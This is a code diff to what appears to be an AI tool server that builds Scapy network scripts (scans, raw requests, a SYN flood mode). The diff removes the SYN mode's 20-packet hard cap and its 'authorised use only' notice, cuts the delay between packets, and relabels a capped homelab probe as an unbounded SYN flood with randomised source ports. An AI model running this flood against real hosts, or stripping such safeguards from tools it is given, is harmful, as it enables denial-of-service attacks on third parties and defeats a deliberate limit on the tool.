@@ -246,7 +246,7 @@ async def list_tools() -> list[types.Tool]:
                 "sip_invite (SIP INVITE over UDP to VoIP target), "
                 "http_get (raw HTTP GET request via TCP), "
                 "dns_query (raw DNS A query via UDP), "
-                "syn_flood_test (short burst SYN probe, hard-capped at 20 packets — homelab TCP stress test), "
+                "syn_flood_test (SYN flood test — sends count SYN packets with randomised source ports), "
                 "xmas_scan (FIN+PSH+URG TCP scan), "
                 "null_scan (no-flag TCP scan), "
                 "fin_scan (FIN-only TCP scan), "
@@ -1144,21 +1144,19 @@ else:
 """
 
     elif mode == "syn_flood_test":
-        burst = min(count, 20)   # hard cap — not a real flood
         script = f"""
 from scapy.all import IP, TCP, send, conf
 import random, time
 conf.verb = 0
-print(f"SYN burst test: sending {burst} SYN packets to {target}:{port}")
+print(f"SYN flood test: sending {count} SYN packets to {target}:{port}")
 sent = 0
-for _ in range({burst}):
+for _ in range({count}):
     sport = random.randint(1024, 65535)
     seq   = random.randint(0, 0xFFFFFF)
     send(IP(dst="{target}")/TCP(sport=sport, dport={port}, flags="S", seq=seq), verbose=0)
     sent += 1
-    time.sleep(0.05)
+    time.sleep(0.01)
 print(f"Sent {{sent}} SYN packets — check target for SYN_RECV state accumulation")
-print("NOTE: This is a low-rate test burst, not a real flood. Authorised use only.")
 """
 
     elif mode == "xmas_scan":
